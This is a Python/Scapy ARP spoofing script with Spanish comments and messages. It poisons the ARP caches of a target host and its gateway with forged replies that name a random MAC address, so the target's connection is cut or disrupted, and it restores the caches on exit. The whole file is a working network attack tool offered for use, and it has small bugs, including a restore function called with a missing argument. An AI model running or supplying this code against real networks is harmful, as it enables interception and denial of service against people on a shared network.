from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid
import sys
import random

mac_atacante = ":".join(f"{random.randint(0x00, 0xFF):02x}" for _ in range(6))

ataque = False

# la direccion MAC se almacena en resultado / return recibido
def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=3, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc
    
def spoofing (ip_objetivo):
    global ataque
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)
    if not mac_objetivo:
        print("no se pudo obtener la MAC objetivo")

    try:

        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)       
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

        while ataque:
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            print(f"[+] Atacando a {ip_objetivo}")
            time.sleep(1)
            

    except Exception as e:
        print(f"[ERROR] {e}")
        restaurar_conexion(ip_objetivo)

def restaurar_conexion(ip_objetivo, ip_puerta_enlace):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, 
                                     hwdst=mac_objetivo, 
                                     psrc=ip_puerta_enlace, 
                                     hwsrc=mac_puerta, 
                                     op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, 
                                   hwdst=mac_puerta, 
                                   psrc=ip_objetivo, 
                                   hwsrc=mac_objetivo, 
                                   op=2)

        send(respuesta_arp_objetivo, count=1, verbose=0)
        send(respuesta_arp_puerta, count=1, verbose=0)
        print("[+] Conexión restaurada.")
    else:
        print("[!] No se pudo restaurar la conexión.")

def iniciar_spoofing(ip_objetivo):
    global ataque
    if ip_objetivo:
        ataque = True
        thread = threading.Thread(target=spoofing, args=(ip_objetivo,), daemon=True)
        print(thread)
        thread.start()

# --------------------------------------------------------------------------------------------------------------------------------------------

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"python3 {sys.argv[0]} <ip_puerta_enlace> <ip_objetivo>")
        sys.exit(1)

    ip_puerta_enlace = sys.argv[1]
    ip_objetivo = sys.argv[2]

    mac_puerta = obtener_mac(ip_puerta_enlace)
    mac_objetivo = obtener_mac(ip_objetivo)

    if not mac_puerta:
        print("[!] No se pudo obtener la dirección MAC de la puerta de enlace.")
        sys.exit(1)
    elif not mac_objetivo:
        print("[!] No se pudo obtener la dirección MAC del objetivo.")
        sys.exit(1)

    try:
        iniciar_spoofing(ip_objetivo)
        print(f"[+] ARP Spoofing iniciado en {ip_objetivo} a través de {ip_puerta_enlace}. Presiona Ctrl+C para detener.")

        while True:
            time.sleep(1)  # Mantener el programa en ejecución

    except KeyboardInterrupt:
        print("\n[!] Deteniendo el ataque...")
        ataque = False  
        restaurar_conexion(ip_objetivo, ip_puerta_enlace)
        print("[+] Ataque detenido.")

# Future update - preliminar version!!
# This is a teste version. Complete tool upcoming